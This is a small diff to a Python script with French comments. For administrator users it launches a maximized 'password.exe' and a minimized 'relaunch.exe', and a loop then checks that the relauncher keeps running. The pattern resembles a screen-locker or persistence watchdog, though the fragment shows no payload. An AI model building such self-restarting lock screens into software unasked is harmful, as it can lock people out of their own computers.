@@ -11,6 +11,9 @@ def is_admin(): # Fonction pour vérifier si l'utilisateur est administrateur
 if is_admin(): # Si l'utilisateur est administrateur
     
     os.system("@ECHO OFF")
+    os.system("start /MAX password.exe")
+    os.system("start /MIN relaunch.exe")
+    time.sleep(1.5)
     
     while True:
         if "relaunch.exe" not in (p.name() for p in psutil.process_iter()):
